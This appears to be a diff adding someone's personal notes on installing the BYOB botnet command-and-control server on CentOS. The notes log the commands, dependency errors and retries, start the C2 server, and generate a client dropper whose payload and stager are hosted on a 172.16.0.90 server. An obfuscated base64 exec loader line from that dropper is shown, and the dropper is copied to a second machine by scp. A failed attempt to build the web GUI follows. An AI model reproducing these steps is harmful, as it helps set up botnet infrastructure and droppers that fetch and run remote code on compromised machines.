@@ -1,0 +1,258 @@
+
+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+#@  
+#@  BOTNET C&C SERVER INSTALL
+#@  
+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   2020-10-10[Oct-Sat]18-24PM 
+
+##https://github.com/malwaredllc/byob
+##https://www.tutorialspoint.com/build-your-own-botnet
+
+==
+INSTALL PYTHON3
+==
+
+sudo yum -y install centos-release-scl
+sudo yum -y install rh-python36
+scl enable rh-python36 bash
+sudo yum install rh-python36-python-pip
+sudo /opt/rh/rh-python36/root/usr/bin/pip install --upgrade pip
+
+==
+INSTALL DEPS
+==
+
+sudo yum -y install git gcc cmake epel-release
+
+==
+DOWNLOAD AND UNZIP BYOB
+==
+
+sudo wget https://github.com/malwaredllc/byob/archive/master.zip
+sudo unzip master.zip
+
+
+cd byob-master/byob/
+
+to install:
+
+sudo /opt/rh/rh-python36/root/usr/bin/pip install -r requirements.txt
+
+Installing collected packages: pyrx, mss, WMI, numpy, six, python-xlib, pyxhook, pytz, PyJWT, urllib3, certifi, chardet, idna, requests, twilio, colorama, altgraph, PyInstaller, pycryptodome, pycrypto
+    Running setup.py install for pyrx ... error
+    ERROR: Command errored out with exit status 1:
+     command: /opt/rh/rh-python36/root/usr/bin/python3 -u -c 'import sys, setuptools, tokenize; sys.argv[0] = '"'"'/tmp/pip-install-56wg23e5/pyrx/setup.py'"'"'; __file__='"'"'/tmp/pip-install-56wg23e5/pyrx/setup.py'"'"';f=getattr(tokenize, '"'"'open'"'"', open)(__file__);code=f.read().replace('"'"'\r\n'"'"', '"'"'\n'"'"');f.close();exec(compile(code, __file__, '"'"'exec'"'"'))' install --record /tmp/pip-record-am79j1f2/install-record.txt --single-version-externally-managed --compile --install-headers /opt/rh/rh-python36/root/usr/include/python3.6m/pyrx
+
+GETTING ERRORS
+
+NOT SURE IF HELPED
+##https://centos.pkgs.org/7/nux-dextop-x86_64/Pyrex-0.9.9-8.el7.nux.noarch.rpm.html
+sudo wget  	https://li.nux.ro/download/nux/dextop/el7/x86_64/Pyrex-0.9.9-8.el7.nux.noarch.rpm
+sudo yum -y install Pyrex-0.9.9-8.el7.nux.noarch.rpm
+
+TYING AGAIN
+
+pip install pyrx
+pip install wheel
+pip install -r requirements.txt
+
+#python setup.py
+sudo python setup.py
+
+DIDNT WORK
+
+SEEMS TO HAVE WORKED
+
+sudo /opt/rh/rh-python36/root/usr/bin/pip3 install pyrx
+sudo /opt/rh/rh-python36/root/usr/bin/python3 setup.py
+
+==
+
+Requirement already satisfied: setuptools in /opt/rh/rh-python36/root/usr/lib/python3.6/site-packages (from PyInstaller==3.6->-r ../byob/requirements.txt (line 11)) (36.5.0)
+Using legacy 'setup.py install' for pyrx, since package 'wheel' is not installed.
+Using legacy 'setup.py install' for WMI, since package 'wheel' is not installed.
+Using legacy 'setup.py install' for pyxhook, since package 'wheel' is not installed.
+Using legacy 'setup.py install' for twilio, since package 'wheel' is not installed.
+Using legacy 'setup.py install' for pycrypto, since package 'wheel' is not installed.
+Installing collected packages: pyrx, mss, WMI, numpy, six, python-xlib, pyxhook, pytz, PyJWT, chardet, certifi, idna, urllib3, requests, twilio, colorama, altgraph, PyInstaller, pycryptodome, pycrypto
+    Running setup.py install for pyrx: started
+    Running setup.py install for pyrx: finished with status 'error'
+[user@centos byob]$
+
+SAME ERROR
+
+sudo /opt/rh/rh-python36/root/usr/bin/python3 setup.py
+
+==
+
+sudo /opt/rh/rh-python36/root/usr/bin/pip3 install wheel
+sudo /opt/rh/rh-python36/root/usr/bin/python3 setup.py
+
+
+Failed to build pyrx
+
+Installing collected packages: pyrx, mss, WMI, numpy, six, python-xlib, pyxhook, pytz, PyJWT, chardet, idna, urllib3, certifi, requests, twilio, colorama, altgraph, PyInstaller, pycryptodome, pycrypto
+    Running setup.py install for pyrx: started
+    Running setup.py install for pyrx: finished with status 'error'
+
+==
+
+Requirement already satisfied: setuptools in /opt/rh/rh-python36/root/usr/lib/python3.6/site-packages (from PyInstaller==3.6->-r ../byob/requirements.txt (line 11)) (36.5.0)
+Building wheels for collected packages: pyrx, WMI, pyxhook, twilio, pycrypto
+  Building wheel for pyrx (setup.py): started
+  Building wheel for pyrx (setup.py): finished with status 'error'
+  Running setup.py clean for pyrx
+
+==
+
+sudo /opt/rh/rh-python36/root/usr/bin/pip3 install pyrx
+sudo /opt/rh/rh-python36/root/usr/bin/python3 setup.py
+
+SEEMS TO HAVE WORKED
+
+NEXT ROADBLOCK
+
+[user@centos byob]$ python server.py –-port 445
+usage: server.py [-h] [--host HOST] [--port PORT] [--database DATABASE]
+                 [--debug] [-v]
+server.py: error: unrecognized arguments: –-port 445
+
+
+USING PROPER SYNTAX BUT NOT WORKING
+
+==
+
+WORKED TO START SERVER
+
+sudo /opt/rh/rh-python36/root/usr/bin/python3 server.py
+
+==
+
+[user@centos byob]$ sudo /opt/rh/rh-python36/root/usr/bin/python3 server.py
+
+
+88                                  88
+88                                  88
+88                                  88
+88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
+88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
+88       d8  `8b   d8'  8b       d8 88       d8
+88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
+8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
+                d8'
+               d8'
+
+
+[?]  Hint: show usage information with the 'help' command
+
+[root @ /home/user/byob-master/byob]>
+
+SERVER RUNNING
+
+==
+
+CLIENT SIDE
+
+==
+
+sudo wget https://github.com/malwaredllc/byob/archive/master.zip
+sudo unzip master.zip
+cd byob-master/byob
+
+python client.py –name testbot.py 172.16.0.90 1337
+/opt/rh/rh-python36/root/usr/bin/python3 client.py 172.16.0.90 1337
+
+sudo scp byob_q42.py user@172.16.0.89:/home/user/
+
+NOT WORKING, STILL ON SERVER SIDE
+
+[user@centos byob]$ sudo /opt/rh/rh-python36/root/usr/bin/python3 client.py 172.16.0.90 1337
+
+
+88                                  88
+88                                  88
+88                                  88
+88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
+88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
+88       d8  `8b   d8'  8b       d8 88       d8
+88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
+8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
+                d8'
+               d8'
+
+
+[>] Modules
+        Adding modules...  -(4 modules added to client)
+
+[>] Imports
+        Adding imports... -(31 imports from 4 modules)
+[>] Payload
+        Uploading payload...  -(hosting payload at: http://172.16.0.90:1338//payloads/q42.py)
+
+[>] Stager
+        Uploading stager...  -(hosting stager at: http://172.16.0.90:1338//stagers/q42.py)
+
+[>] Dropper
+        Writing dropper...  (343 bytes written to byob_q42.py)
+
+		
+==
+
+.0.90 1337
+sudo: /opt/rh/rh-python36/root/usr/bin/python3: command not found
+[user@centos byob]$ sudo python client.py 172.16.0.90 1337                        Traceback (most recent call last):
+  File "client.py", line 98, in <module>
+    import colorama
+ImportError: No module named colorama
+[user@centos byob]$ sudo python client.py 172.16.0.90 1337
+
+
+==
+
+sudo pip install colorama
+sudo python client.py 172.16.0.90 1337
+
+[user@centos byob]$ python byob_v6T.py
+Traceback (most recent call last):
+  File "byob_v6T.py", line 5, in <module>
+    exec(eval(marshal.loads(zlib.decompress(base64.b64decode('eJwrtmRgYCgtyskvSM3TUM8oKSmw0tc3NDfSMzTTM9CzNLAyNDa20NcvLklMTy0q1i8zC9ErqFTX1CtKTUzR0AQAHjYRjg==')))))
+  File "<string>", line 1
+    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
+    ^
+SyntaxError: invalid syntax
+
+
+==
+
+USING/STARTING WEB GUI
+
+sudo yum -y install docker
+sudo systemctl start docker
+sudo systemctl enable docker
+
+cd byob-master/web-gui
+
+sudo ./startup.sh
+
+Errors were encountered while processing:
+ /var/cache/apt/archives/wine-staging-i386_5.19~xenial_i386.deb
+ /var/cache/apt/archives/wine-staging-amd64_5.19~xenial_amd64.deb
+E: Sub-process /usr/bin/dpkg returned an error code (1)
+The command '/bin/sh -c set -x     && dpkg --add-architecture i386     && apt-get update -qy     && apt-get install --no-install-recommends -qfy apt-transport-https software-properties-common wget     && wget -nv https://dl.winehq.org/wine-builds/winehq.key     && apt-key add winehq.key     && add-apt-repository 'https://dl.winehq.org/wine-builds/ubuntu/'     && apt-get update -qy     && apt-get install --no-install-recommends -qfy $WINE_VERSION winbind cabextract     && apt-get clean     && wget -nv https://raw.githubusercontent.com/Winetricks/winetricks/master/src/winetricks     && chmod +x winetricks     && mv winetricks /usr/local/bin' returned a non-zero code: 100
+Running C2 server with locally hosted web app GUI...
+Navigate to http://127.0.0.1:5000 and set up your user to get started.
+./startup.sh: line 44: python3: command not found
+
+DIDNT WORK TO START WEBGUI
+
+STILL GETTING ERRORS
+
+Step 18/25 : RUN /usr/bin/pip install pyinstaller==$PYINSTALLER_VERSION
+ ---> Running in 02b5d9c012ae
+
+0044:err:explorer:initialize_display_settings Failed to query current display settings for L"\\\\.\\DISPLAY1".
+0098:err:ntoskrnl:ZwLoadDriver failed to create driver L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\wineusb": c0000142
+Collecting pyinstaller==3.6
+  Downloading PyInstaller-3.6.tar.gz (3.5 MB)
+  Installing build dependencies: started
+^C
